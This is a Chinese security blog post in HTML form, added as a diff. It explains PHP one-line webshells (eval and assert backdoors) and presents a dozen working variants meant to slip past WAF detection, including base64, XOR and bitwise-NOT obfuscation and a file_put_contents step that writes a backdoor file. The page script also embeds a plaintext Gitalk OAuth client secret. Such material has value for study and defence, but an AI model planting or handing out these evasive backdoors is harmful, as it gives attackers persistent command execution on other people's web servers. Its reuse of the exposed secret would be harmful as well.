@@ -1,0 +1,389 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>PHP一句话分析 | tututu12138</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://tututu12138.github.io/favicon.ico?v=1608862949086">
+<link rel="stylesheet" href="https://tututu12138.github.io/styles/main.css">
+
+
+  
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css" />
+  
+
+  
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="Webshell含义
+webshell 就是以网页文件形式存在的一种命令执行环境，也可以将其称做为一种网页后门。顾名思义，web的含义是显然需要服务器开放web服务，shell的含义是取得对服务器某种程度上操作权限。webshell常常被称..." />
+    <meta name="keywords" content="PHP,一句话" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://tututu12138.github.io">
+        <img src="https://tututu12138.github.io/images/avatar.png?v=1608862949086" class="site-logo">
+        <h1 class="site-title">tututu12138</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+          <a class="social-link" href="https://github.com/tututu12138" target="_blank">
+            <i class="fab fa-github"></i>
+          </a>
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      突击小分队~
+    </div>
+    <div class="site-footer">
+      Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | <a class="rss" href="https://tututu12138.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">PHP一句话分析</h2>
+            <div class="post-date">2020-11-18</div>
+            
+            <div class="post-content" v-pre>
+              <h1 id="webshell含义">Webshell含义</h1>
+<p>webshell 就是以网页文件形式存在的一种命令执行环境，也可以将其称做为一种网页后门。顾名思义，web的含义是显然需要服务器开放web服务，shell的含义是取得对服务器某种程度上操作权限。webshell常常被称为入侵者通过网站端口对网站服务器的某种程度上操作的权限。由于 webshell 其大多是以动态脚本的形式出现，也有人称之为网站的后门工具。<br>
+一句话木马、小马、大马都可以叫 webshell。</p>
+<pre><code>一句话木马就是只需要一行代码的木马，短短一行代码，就能做到和大马相当的功能。为了绕过waf的检测，一句话木马出现了无数中变形，但本质是不变的：木马的函数执行了我们发送的命令。
+</code></pre>
+<h2 id="一句话木马原理php">一句话木马原理（PHP）</h2>
+<p>一句话木马的原理是利用了PHP中的eval()。注：eval是因为是一个语言构造器而不是一个函数。</p>
+<pre><code>1）PHP eval() 把字符串按照 PHP 代码来计算。
+2）该字符串必须是合法的 PHP 代码，且必须以分号结尾。
+3）如果没有在代码字符串中调用return语句，则返回NULL。如果代码中存在解析错误，则 eval() 函数返回 false。
+</code></pre>
+<p>主要会使用到函数及说明（<a href="https://www.php.net/manual/zh/">PHP手册</a>）：</p>
+<table>
+<thead>
+<tr>
+<th>函数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>eval</td>
+<td>PHP 4, PHP 5, PHP 7+ 均可用，接受一个参数，将字符串作为PHP代码执行</td>
+</tr>
+<tr>
+<td>assert</td>
+<td>PHP 4, PHP 5,PHP 7.2 以下均可用，一般接受一个参数，php 5.4.8版本后可以接受两个参数</td>
+</tr>
+<tr>
+<td>正则匹配类</td>
+<td>preg_replace/ mb_ereg_replace/preg_filter等</td>
+</tr>
+<tr>
+<td>文件包含类</td>
+<td>include/include_once/require/require_once/file_get_contents等</td>
+</tr>
+</tbody>
+</table>
+<p>基本的一句话木马：</p>
+<pre><code>&lt;?php
+@eval($_POST[a]);
+?&gt;
+
+注：@是忽略可能出现的错误,建议使用eval、assert时都加上
+</code></pre>
+<h2 id="一句话绕过">一句话绕过：</h2>
+<h3 id="1特殊函数写webshell">1.特殊函数写webshell</h3>
+<ul>
+<li>call_user_func 回调函数</li>
+</ul>
+<p><strong>call_user_func</strong> 这个函数可以调用其它函数，被调用的函数是 call_user_func 的第一个函数，被调用的函数的参数是call_user_func的第二个参数。这样的一个语句也可以完成一句话木马。一些被waf拦截的木马可以配合这个函数绕过waf。<strong>call_user_func + assert 构造的一句话木马在 php 7.0 版本及以下可以使用</strong>(<em>注：在php&gt;=7.2版本后，禁用给assert()函数传入字符串参数，因为通过超全局常量$_GET['']获取的攻击者输入是字符串，这样传入assert函数就触发了禁用。但是直接assert(phpinfo())传入的参数是函数，所以就不会触发函数禁用，可以正常回显。</em>)</p>
+<pre><code>&lt;?php
+@call_user_func(assert,$_POST['a']);
+?&gt;
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://okc-pic.oss-cn-beijing.aliyuncs.com/img/QQ%E5%9B%BE%E7%89%8720201118142707.png" alt="" loading="lazy"></figure>
+<pre><code>&lt;?php
+@call_user_func(assert,phpinfo());
+?&gt;
+</code></pre>
+<p><img src="https://okc-pic.oss-cn-beijing.aliyuncs.com/img/2.png" alt="image" loading="lazy"><br>
+(这里call_user_func函数不能调用eval，因为eval是一个语言构造器而不是一个函数，不能被可变函数调用。call_user_func有两个参数，第一个参数要求是函数，而eval只是一个语言构造器而不是函数，所以不符合call_user_func的语法，调用eval就会报错。)</p>
+<ul>
+<li>preg_replace_callback()函数</li>
+</ul>
+<pre><code>&lt;?php
+preg_replace_callback('/.+/i', create_function('$arr', 'return assert($arr[0]);'), $_REQUEST['pass']);
+?&gt;
+</code></pre>
+<p>原理：通过create_function“创造”一个函数，它接受一个数组，并将数组的第一个元素$arr[0]传入assert。</p>
+<ul>
+<li>file_put_contents 函数</li>
+</ul>
+<pre><code>&lt;?php
+$test='&lt;?php $a=$_POST[&quot;cmd&quot;];assert($a); ?&gt;';
+file_put_contents(&quot;muma.php&quot;, $test);
+?&gt;
+</code></pre>
+<p>这里利用函数生成muma.php木马文件。此木马文件的内容是<strong>file_put_contents函数</strong>(生成一个文件,第一个参数是文件名，第二个参数是文件的内容。)</p>
+<h3 id="2bypass-waf">2.bypass WAF</h3>
+<p>WAF 通常以关键字判断是否为一句话木马，但是可以通过对一句话木马的变形，动态调用，隐藏或者替换关键字，达到绕过WAF的目的。所以想要绕过 WAF，就需要掌握各种 PHP 小技巧，掌握的技巧多了，把技巧结合起来，才可以设计出符合当时环境的一句话木马。</p>
+<ul>
+<li>PHP变量函数</li>
+</ul>
+<pre><code>&lt;?php 
+$a = &quot;eval&quot;;
+$a(@$_POST['a']); 
+?&gt;
+</code></pre>
+<ul>
+<li>str_replace()函数<br>
+函数功能：在第三个参数中，查找第一个参数，并替换成第二个参数。这里第二个参数为空字符串，就相当于删除&quot;Waldo&quot;。</li>
+</ul>
+<pre><code>&lt;?php
+$a=str_replace(&quot;Waldo&quot;, &quot;&quot;, &quot;eWaldoval&quot;);
+$a(@$_POST['a']);
+?&gt;
+</code></pre>
+<ul>
+<li>base64_decode()函数</li>
+</ul>
+<pre><code>&lt;?php
+$a=base64_decode(&quot;ZXZhbA==&quot;);   //ZXZhbA== 是eval的base64加密
+$a($_POST['a']);
+?&gt;
+</code></pre>
+<ul>
+<li>&quot;.&quot;操作符</li>
+</ul>
+<pre><code>//&quot;.&quot;并置操作符，连接两个及以上字符串；例如a=&quot;li&quot;,b=&quot;hua&quot;,c=a.b即c=lihua
+&lt;?php
+$a=&quot;e&quot;.&quot;v&quot;;
+$b=&quot;a&quot;.&quot;l&quot;;
+$c=$a.$b;
+$c($_POST['a']);
+?&gt;
+</code></pre>
+<ul>
+<li>parse_str()函数</li>
+</ul>
+<pre><code>&lt;?php
+$str=&quot;a=eval&quot;;
+parse_str($str);  //生成一个变量$a，值为字符串&quot;eval&quot;
+$a($_POST['a']);
+?&gt;
+</code></pre>
+<ul>
+<li>strtr()函数<br>
+strtr(string,from,to)</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>string</td>
+<td>必需。规定要转换的字符串。</td>
+</tr>
+<tr>
+<td>from</td>
+<td>必需（除非使用数组）。规定要改变的字符。</td>
+</tr>
+<tr>
+<td>to</td>
+<td>必需（除非使用数组）。规定要改变为的字符。</td>
+</tr>
+<tr>
+<td>array</td>
+<td>必需（除非使用from和to）。数组，其中的键名是更改的原始字符，键值是更改的目标字符。</td>
+</tr>
+</tbody>
+</table>
+<pre><code>&lt;?php 
+    $a = strtr('atestt','test','sser');
+    $a($_POST['x']);
+?&gt;
+</code></pre>
+<ul>
+<li>异或操作<br>
+在PHP中，两个字符串执行异或操作以后，得到的还是一个字符串。所以，我们想得到a-z中某个字母，就找到某两个非字母、数字的字符，他们的异或结果是这个字母即可。(PHP5)</li>
+</ul>
+<pre><code>&lt;?php
+$_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`');   // $_='assert';
+$__='_'.('%0D'^']').('%2F'^'`').('%0E'^']').('%09'^']');   // $__='_POST';
+$___=$$__;
+$_($___[_]);   // assert($_POST[_]);
+?&gt;
+</code></pre>
+<ul>
+<li>取反操作<br>
+利用的是UTF-8编码的某个汉字，并将其中某个字符取出来，比如'和'{2}的结果是&quot;\x8c&quot;，其取反即为字母s。利用这个特性就可以找些汉字来构造出assert。<br>
+<img src="https://okc-pic.oss-cn-beijing.aliyuncs.com/img/233.png" alt="" loading="lazy"></li>
+</ul>
+<pre><code>&lt;?php
+$__=('&gt;'&gt;'&lt;')+('&gt;'&gt;'&lt;');
+$_=$__/$__;
+
+$____='';
+$___=&quot;瞰&quot;;$____.=~($___{$_});$___=&quot;和&quot;;$____.=~($___{$__});$___=&quot;和&quot;;$____.=~($___{$__});$___=&quot;的&quot;;$____.=~($___{$_});$___=&quot;半&quot;;$____.=~($___{$_});$___=&quot;始&quot;;$____.=~($___{$__});
+
+$_____='_';$___=&quot;俯&quot;;$_____.=~($___{$__});$___=&quot;瞰&quot;;$_____.=~($___{$__});$___=&quot;次&quot;;$_____.=~($___{$_});$___=&quot;站&quot;;$_____.=~($___{$_});
+
+$_=$$_____;
+$____($_[$__]);
+?&gt;
+</code></pre>
+<h3 id="困境">困境：</h3>
+<p>php7之后我们已经不能使用强大的assert函数了,waf只要把函数封死就可以有效的阻止webshell免杀,而eval并没有assert那么灵活。后期⼤家可能更加倾向使用大马。</p>
+<h2 id="参考">参考：</h2>
+<p><a href="https://xz.aliyun.com/t/3924">php一句话绕过技术分析</a><br>
+<a href="http://blog.leanote.com/post/snowming/2e1ab18dfa80">一句话木马分析</a><br>
+<a href="https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html#%22%3Ehttps://www.leavesongs.com/PENETRATION/php-callback-backdoor.html">PHP回调后门</a><br>
+<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html#">无数字和字母的webshell</a><br>
+<a href="https://xz.aliyun.com/t/5152">对于php免杀webshell的一些总结</a></p>
+
+            </div>
+            
+              <div class="tag-container">
+                
+                  <a href="https://tututu12138.github.io/tag/bTRieDYVH/" class="tag">
+                    PHP
+                  </a>
+                
+                  <a href="https://tututu12138.github.io/tag/tkP7SQ9oqI/" class="tag">
+                    一句话
+                  </a>
+                
+              </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://tututu12138.github.io/post/nmap-shi-yong-xiang-jie/">
+                  <h3 class="post-title">
+                    nmap使用详解
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+              
+                <div id="gitalk-container" data-aos="fade-in"></div>
+              
+
+              
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+
+  
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+
+      var gitalk = new Gitalk({
+        clientID: '3d062d911e59ec4e0804',
+        clientSecret: '790f7f2e530e29016bdac68c460b9f4afd71e62f',
+        repo: 'tututu12138.github.io',
+        owner: 'tututu12138',
+        admin: ['tututu12138'],
+        id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+        distractionFreeMode: false  // Facebook-like distraction free mode
+      })
+
+      gitalk.render('gitalk-container')
+
+    </script>
+  
+
+  
+
+
+
+
+  </body>
+</html>
